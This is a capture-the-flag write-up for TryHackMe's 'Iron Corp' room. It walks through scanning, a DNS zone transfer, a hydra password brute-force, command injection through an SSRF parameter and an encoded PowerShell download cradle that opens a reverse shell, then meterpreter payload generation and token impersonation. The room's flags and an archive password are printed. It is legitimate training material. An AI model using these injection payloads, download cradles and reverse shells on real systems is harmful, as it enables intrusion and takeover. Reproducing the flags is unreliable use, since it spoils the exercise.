# Iron Corp

Can you get access to Iron Corp's system?

[Iron Corp](https://tryhackme.com/room/ironcorp)

## Topic's

- Network Enumeration
- Web Enumeration
- DNS Enumeration
- Brute Forcing (http-get)
- Web Poking
- Remote File Inclusion
- Metasploit (Delegation Tokens)

## Appendix archive

Password: `1 kn0w 1 5h0uldn'7!`

## Task 1 Iron Corp

Iron Corp suffered a security breach not long time ago.

You have been chosen by Iron Corp to conduct a penetration test of their asset. They did system hardening and are expecting you not to be able to access their system.

The asset in scope is: ironcorp.me

Note: Edit your config file and add ironcorp.me

Note 2: It might take around 5-7 minutes for the VM to fully boot, so please be patient.

Happy hacking!

```
kali@kali:~/CTFs/tryhackme/Iron Corp$ sudo nmap -Pn -A -sS -sC -sV -O ironcorp.me
Starting Nmap 7.80 ( https://nmap.org ) at 2020-10-21 21:21 CEST
Nmap scan report for ironcorp.me (10.10.154.237)
Host is up (0.038s latency).
Not shown: 996 filtered ports
PORT     STATE SERVICE       VERSION
53/tcp   open  domain?
| fingerprint-strings:
|   DNSVersionBindReqTCP:
|     version
|_    bind
135/tcp  open  msrpc         Microsoft Windows RPC
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| rdp-ntlm-info:
|   Target_Name: WIN-8VMBKF3G815
|   NetBIOS_Domain_Name: WIN-8VMBKF3G815
|   NetBIOS_Computer_Name: WIN-8VMBKF3G815
|   DNS_Domain_Name: WIN-8VMBKF3G815
|   DNS_Computer_Name: WIN-8VMBKF3G815
|   Product_Version: 10.0.14393
|_  System_Time: 2020-10-21T19:24:29+00:00
| ssl-cert: Subject: commonName=WIN-8VMBKF3G815
| Not valid before: 2020-10-20T19:20:59
|_Not valid after:  2021-04-21T19:20:59
|_ssl-date: 2020-10-21T19:24:45+00:00; +1s from scanner time.
8080/tcp open  http          Microsoft IIS httpd 10.0
| http-methods:
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Dashtreme Admin - Free Dashboard for Bootstrap 4 by Codervent
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port53-TCP:V=7.80%I=7%D=10/21%Time=5F908A63%P=x86_64-pc-linux-gnu%r(DNS
SF:VersionBindReqTCP,20,"\0\x1e\0\x06\x81\x04\0\x01\0\0\0\0\0\0\x07version
SF:\x04bind\0\0\x10\0\x03");
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2016 (89%)
OS CPE: cpe:/o:microsoft:windows_server_2016
Aggressive OS guesses: Microsoft Windows Server 2016 (89%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

TRACEROUTE (using port 135/tcp)
HOP RTT      ADDRESS
1   36.67 ms 10.8.0.1
2   37.38 ms ironcorp.me (10.10.154.237)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 171.63 seconds
```

```
kali@kali:~/CTFs/tryhackme/Iron Corp$ sudo nmap -Pn -sV -sC -p53,135,3389,8080,11025,49667,49670 ironcorp.me[sudo] password for kali:
Starting Nmap 7.80 ( https://nmap.org ) at 2020-10-21 21:29 CEST
Nmap scan report for ironcorp.me (10.10.154.237)
Host is up (0.054s latency).

PORT      STATE    SERVICE       VERSION
53/tcp    open     domain?
| fingerprint-strings:
|   DNSVersionBindReqTCP:
|     version
|_    bind
135/tcp   open     msrpc         Microsoft Windows RPC
3389/tcp  open     ms-wbt-server Microsoft Terminal Services
| ssl-cert: Subject: commonName=WIN-8VMBKF3G815
| Not valid before: 2020-10-20T19:20:59
|_Not valid after:  2021-04-21T19:20:59
|_ssl-date: 2020-10-21T19:30:15+00:00; +1s from scanner time.
8080/tcp  open     http          Microsoft IIS httpd 10.0
11025/tcp open     unknown
49667/tcp filtered unknown
49670/tcp open     unknown
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port53-TCP:V=7.80%I=7%D=10/21%Time=5F908C0E%P=x86_64-pc-linux-gnu%r(DNS
SF:VersionBindReqTCP,20,"\0\x1e\0\x06\x81\x04\0\x01\0\0\0\0\0\0\x07version
SF:\x04bind\0\0\x10\0\x03");
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 71.46 seconds
```

```
kali@kali:~/CTFs/tryhackme/Iron Corp$ gobuster dir -u http://ironcorp.me:8080/ -w /usr/share/wordlists/dirb/common.txt -q -t 25 -x php,html,txt
/assets (Status: 301)
/calendar.html (Status: 200)
/forms.html (Status: 200)
/icons.html (Status: 200)
/Index.html (Status: 200)
/index.html (Status: 200)
/index.html (Status: 200)
/login.html (Status: 200)
/Login.html (Status: 200)
/profile.html (Status: 200)
/register.html (Status: 200)
```

```
kali@kali:~/CTFs/tryhackme/Iron Corp$ dig 10.10.154.237

; <<>> DiG 9.16.2-Debian <<>> 10.10.154.237
;; global options: +cmd
;; Got answer:
;; ->>HEADER<<- opcode: QUERY, status: NXDOMAIN, id: 8203
;; flags: qr rd ra; QUERY: 1, ANSWER: 0, AUTHORITY: 1, ADDITIONAL: 1

;; OPT PSEUDOSECTION:
; EDNS: version: 0, flags:; udp: 4096
;; QUESTION SECTION:
;10.10.154.237.                 IN      A

;; AUTHORITY SECTION:
.                       3385    IN      SOA     a.root-servers.net. nstld.verisign-grs.com. 2020102101 1800 900 604800 86400

;; Query time: 68 msec
;; SERVER: 192.168.178.1#53(192.168.178.1)
;; WHEN: Wed Oct 21 21:23:01 CEST 2020
;; MSG SIZE  rcvd: 117
```

```
kali@kali:~/CTFs/tryhackme/Iron Corp$ dig ironcorp.me @10.10.154.237 axfr

; <<>> DiG 9.16.2-Debian <<>> ironcorp.me @10.10.154.237 axfr
;; global options: +cmd
ironcorp.me.            3600    IN      SOA     win-8vmbkf3g815. hostmaster. 3 900 600 86400 3600
ironcorp.me.            3600    IN      NS      win-8vmbkf3g815.
admin.ironcorp.me.      3600    IN      A       127.0.0.1
internal.ironcorp.me.   3600    IN      A       127.0.0.1
ironcorp.me.            3600    IN      SOA     win-8vmbkf3g815. hostmaster. 3 900 600 86400 3600
;; Query time: 248 msec
;; SERVER: 10.10.154.237#53(10.10.154.237)
;; WHEN: Wed Oct 21 21:24:40 CEST 2020
;; XFR size: 5 records (messages 1, bytes 238)
```

```
kali@kali:~/CTFs/tryhackme/Iron Corp$ gobuster dir -u http://internal.ironcorp.me:8080/ -w /usr/share/wordlists/dirb/common.txt -q -t 25 -x php,html,txt
/assets (Status: 301)
/calendar.html (Status: 200)
/forms.html (Status: 200)
/icons.html (Status: 200)
/index.html (Status: 200)
/Index.html (Status: 200)
/index.html (Status: 200)
/login.html (Status: 200)
/Login.html (Status: 200)
/profile.html (Status: 200)
/register.html (Status: 200)
```

```
ali@kali:~/CTFs/tryhackme/Iron Corp$ gobuster dir -u http://admin.ironcorp.me:8080/ -w /usr/share/wordlists/dirb/common.txt -q -t 25 -x php,html,txt
/assets (Status: 301)
/calendar.html (Status: 200)
/forms.html (Status: 200)
/icons.html (Status: 200)
/index.html (Status: 200)
/Index.html (Status: 200)
/index.html (Status: 200)
/login.html (Status: 200)
/Login.html (Status: 200)
/profile.html (Status: 200)
/register.html (Status: 200)
```

```
kali@kali:~/CTFs/tryhackme/Iron Corp$ gobuster dir -u http://ironcorp.me:11025/ -w /usr/share/wordlists/dirb/common.txt -q -t 50 -x php,html,txt,aspx,asp -s 200,301
/css (Status: 301)
/img (Status: 301)
/Index.html (Status: 200)
/index.html (Status: 200)
/js (Status: 301)
/license (Status: 200)
/LICENSE (Status: 200)
/vendor (Status: 301)
```

```
kali@kali:~/CTFs/tryhackme/Iron Corp$ gobuster dir -u http://admin.ironcorp.me:11025/ -w /usr/share/wordlists/dirb/common.txt -q -t 50 -x php,html,txt,aspx,asp -s 200,301
/css (Status: 301)
/img (Status: 301)
/Index.html (Status: 200)
/index.html (Status: 200)
/js (Status: 301)
/license (Status: 200)
/LICENSE (Status: 200)
/vendor (Status: 301)
```

[http://admin.ironcorp.me:11025/](http://admin.ironcorp.me:11025/)

```
kali@kali:~/CTFs/tryhackme/Iron Corp$ hydra -L http_default_users.txt -P /usr/share/wordlists/SecLists/Passwords/Common-Credentials/best1050.txt -s 11025 -f admin.ironcorp.me http-get /Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-10-21 21:43:32
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14686 login tries (l:14/p:1049), ~918 tries per task
[DATA] attacking http-get://admin.ironcorp.me:11025/
[11025][http-get] host: admin.ironcorp.me   login: admin   password: password123
[STATUS] attack finished for admin.ironcorp.me (valid pair found)
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2020-10-21 21:43:55
```

`admin:password123`

[view-source:http://admin.ironcorp.me:11025/](view-source:http://admin.ironcorp.me:11025/)

```html
<script type="text/javascript">
  <!--
  function lhook(id) {
    var e = document.getElementById(id);
    if (e.style.display == "block") e.style.display = "none";
    else e.style.display = "block";
  }
  //-->
</script>
<!DOCTYPE html>
<html>
  <head>
    <title>Search Panel</title>
  </head>

  <body>
    <h2>Ultimate search bar</h2>

    <div>
      <form method="GET" action="#">
        <span
          >Search:
          <input name="r" type="text" placeholder="******" />
          <input type="submit" />
        </span>
      </form>
    </div>
  </body>
</html>
```

[view-source:http://admin.ironcorp.me:11025/?r=http://internal.ironcorp.me:11025/](view-source:http://admin.ironcorp.me:11025/?r=http://internal.ironcorp.me:11025/)

```html
<html>

<body>

		<b>You can find your name <a href=http://internal.ironcorp.me:11025/name.php?name=>here</a>

</body>

</html>
```

[view-source:http://admin.ironcorp.me:11025/?r=http://internal.ironcorp.me:11025/name.php?name=](view-source:http://admin.ironcorp.me:11025/?r=http://internal.ironcorp.me:11025/name.php?name=)

```html
<html>
  <body>
    <b>My name is: </b>
    <pre>
	Equinox
</pre
    >
  </body>
</html>
```

```
GET /?r=http://internal.ironcorp.me:11025/name.php?name=test|whoami HTTP/1.1
Host: admin.ironcorp.me:11025
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Authorization: Basic YWRtaW46cGFzc3dvcmQxMjM=
Connection: close
Upgrade-Insecure-Requests: 1
```

```html
<html>
  <body>
    <b>My name is: </b>
    <pre>
	nt authority\system
</pre
    >
  </body>
</html>
```

`powershell.exe -c iex(new-object net.webclient).downloadstring('http://10.8.106.222/Invoke-PowerShellTcp.ps1')`

```
%25%37%30%25%36%66%25%37%37%25%36%35%25%37%32%25%37%33%25%36%38%25%36%35%25%36%63%25%36%63%25%32%65%25%36%35%25%37%38%25%36%35%25%32%30%25%32%64%25%36%33%25%32%30%25%36%39%25%36%35%25%37%38%25%32%38%25%36%65%25%36%35%25%37%37%25%32%64%25%36%66%25%36%32%25%36%61%25%36%35%25%36%33%25%37%34%25%32%30%25%36%65%25%36%35%25%37%34%25%32%65%25%37%37%25%36%35%25%36%32%25%36%33%25%36%63%25%36%39%25%36%35%25%36%65%25%37%34%25%32%39%25%32%65%25%36%34%25%36%66%25%37%37%25%36%65%25%36%63%25%36%66%25%36%31%25%36%34%25%37%33%25%37%34%25%37%32%25%36%39%25%36%65%25%36%37%25%32%38%25%32%37%25%36%38%25%37%34%25%37%34%25%37%30%25%33%61%25%32%66%25%32%66%25%33%31%25%33%30%25%32%65%25%33%38%25%32%65%25%33%31%25%33%30%25%33%36%25%32%65%25%33%32%25%33%32%25%33%32%25%32%66%25%34%39%25%36%65%25%37%36%25%36%66%25%36%62%25%36%35%25%32%64%25%35%30%25%36%66%25%37%37%25%36%35%25%37%32%25%35%33%25%36%38%25%36%35%25%36%63%25%36%63%25%35%34%25%36%33%25%37%30%25%32%65%25%37%30%25%37%33%25%33%31%25%32%37%25%32%39
```

```
GET /?r=http://internal.ironcorp.me:11025/name.php?name=test|%25%37%30%25%36%66%25%37%37%25%36%35%25%37%32%25%37%33%25%36%38%25%36%35%25%36%63%25%36%63%25%32%65%25%36%35%25%37%38%25%36%35%25%32%30%25%32%64%25%36%33%25%32%30%25%36%39%25%36%35%25%37%38%25%32%38%25%36%65%25%36%35%25%37%37%25%32%64%25%36%66%25%36%32%25%36%61%25%36%35%25%36%33%25%37%34%25%32%30%25%36%65%25%36%35%25%37%34%25%32%65%25%37%37%25%36%35%25%36%32%25%36%33%25%36%63%25%36%39%25%36%35%25%36%65%25%37%34%25%32%39%25%32%65%25%36%34%25%36%66%25%37%37%25%36%65%25%36%63%25%36%66%25%36%31%25%36%34%25%37%33%25%37%34%25%37%32%25%36%39%25%36%65%25%36%37%25%32%38%25%32%37%25%36%38%25%37%34%25%37%34%25%37%30%25%33%61%25%32%66%25%32%66%25%33%31%25%33%30%25%32%65%25%33%38%25%32%65%25%33%31%25%33%30%25%33%36%25%32%65%25%33%32%25%33%32%25%33%32%25%32%66%25%34%39%25%36%65%25%37%36%25%36%66%25%36%62%25%36%35%25%32%64%25%35%30%25%36%66%25%37%37%25%36%35%25%37%32%25%35%33%25%36%38%25%36%35%25%36%63%25%36%63%25%35%34%25%36%33%25%37%30%25%32%65%25%37%30%25%37%33%25%33%31%25%32%37%25%32%39 HTTP/1.1
Host: admin.ironcorp.me:11025
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Authorization: Basic YWRtaW46cGFzc3dvcmQxMjM=
Connection: close
Upgrade-Insecure-Requests: 1
```

```
kali@kali:~/CTFs/tryhackme/Iron Corp$ nc -lnvp 9001
Listening on 0.0.0.0 9001
whoami
Connection received on 10.10.204.174 49974
Windows PowerShell running as user WIN-8VMBKF3G815$ on WIN-8VMBKF3G815
Copyright (C) 2015 Microsoft Corporation. All rights reserved.

PS E:\xampp\htdocs\internal>nt authority\system
PS E:\xampp\htdocs\internal> cd C:\Users\Administrator\Desktop
PS C:\Users\Administrator\Desktop> dir


    Directory: C:\Users\Administrator\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        3/28/2020  12:39 PM             37 user.txt


PS C:\Users\Administrator\Desktop> type user.txt
thm{09b408056a13fc222f33e6e4cf599f8c}
```

```
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.8.106.222 LPORT=9002 -f psh -o meterpreter-64.ps1
```

```
powershell -command "& { iwr 10.8.106.222/meterpreter-64.ps1 -OutFile C:\Users\Administrator\Desktop\meterpreter-64.ps1 }"
Import-Module .\meterpreter-64.ps1
```

```
kali@kali:~/CTFs/tryhackme/Iron Corp$ msfconsole -x "use multi/handler;set payload windows/x64/meterpreter/reverse_tcp; set lhost tun0; set lport 9002; set ExitOnSession false; exploit -j"
[*] No payload configured, defaulting to windows/x64/meterpreter/reverse_tcp

# cowsay++
 ____________
< metasploit >
 ------------
       \   ,__,
        \  (oo)____
           (__)    )\
              ||--|| *


       =[ metasploit v5.0.101-dev                         ]
+ -- --=[ 2049 exploits - 1108 auxiliary - 344 post       ]
+ -- --=[ 562 payloads - 45 encoders - 10 nops            ]
+ -- --=[ 7 evasion                                       ]

Metasploit tip: Use help <command> to learn more about any command

[*] Using configured payload generic/shell_reverse_tcp
payload => windows/x64/meterpreter/reverse_tcp
lhost => tun0
lport => 9002
ExitOnSession => false
[*] Exploit running as background job 0.
[*] Exploit completed, but no session was created.

[*] Started reverse TCP handler on 10.8.106.222:9002
msf5 exploit(multi/handler) > [*] Sending stage (201283 bytes) to 10.10.187.24
[*] Meterpreter session 1 opened (10.8.106.222:9002 -> 10.10.187.24:50020) at 2020-10-22 00:12:42 +0200

msf5 exploit(multi/handler) > sessions -i 1
[*] Starting interaction with 1...

meterpreter > use incognito
Loading extension incognito...Success.
meterpreter > list_tokens -u

Delegation Tokens Available
========================================
NT AUTHORITY\IUSR
NT AUTHORITY\LOCAL SERVICE
NT AUTHORITY\NETWORK SERVICE
NT AUTHORITY\SYSTEM
WIN-8VMBKF3G815\Admin
Window Manager\DWM-1

Impersonation Tokens Available
========================================
NT AUTHORITY\ANONYMOUS LOGON

meterpreter > impersonate_token "WIN-8VMBKF3G815\Admin"
[+] Delegation token available
[+] Successfully impersonated user WIN-8VMBKF3G815\Admin
meterpreter > getuid
[-] stdapi_sys_config_getuid: Operation failed: Access is denied.
meterpreter > shell
Process 2428 created.
Channel 1 created.
Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.

E:\xampp\htdocs\internal>whoami
whoami
win-8vmbkf3g815\admin

E:\xampp\htdocs\internal>cd C:\Users\Admin\Desktop
cd C:\Users\Admin\Desktop

E:\xampp\htdocs\internal>dir
dir
 Volume in drive E is New Volume
 Volume Serial Number is DE7B-E159

 Directory of E:\xampp\htdocs\internal

04/11/2020  09:11 AM    <DIR>          .
04/11/2020  09:11 AM    <DIR>          ..
03/27/2020  08:38 AM                53 .htaccess
04/11/2020  09:34 AM               131 index.php
04/11/2020  09:34 AM               142 name.php
               3 File(s)            326 bytes
               2 Dir(s)   1,468,583,936 bytes free

E:\xampp\htdocs\internal>dir C:\Users\Admin\Desktop
dir C:\Users\Admin\Desktop
 Volume in drive C has no label.
 Volume Serial Number is 7805-3F28

 Directory of C:\Users\Admin\Desktop

04/12/2020  01:17 AM    <DIR>          .
04/12/2020  01:17 AM    <DIR>          ..
03/28/2020  12:39 PM                37 root.txt
               1 File(s)             37 bytes
               2 Dir(s)  39,161,888,768 bytes free

E:\xampp\htdocs\internal>type C:\Users\Admin\Desktop\root.txt
type C:\Users\Admin\Desktop\root.txt
thm{a1f936a086b367761cc4e7dd6cd2e2bd}
E:\xampp\htdocs\internal>
```

1. user.txt

`thm{09b408056a13fc222f33e6e4cf599f8c}`

2. root.txt

`thm{a1f936a086b367761cc4e7dd6cd2e2bd}`
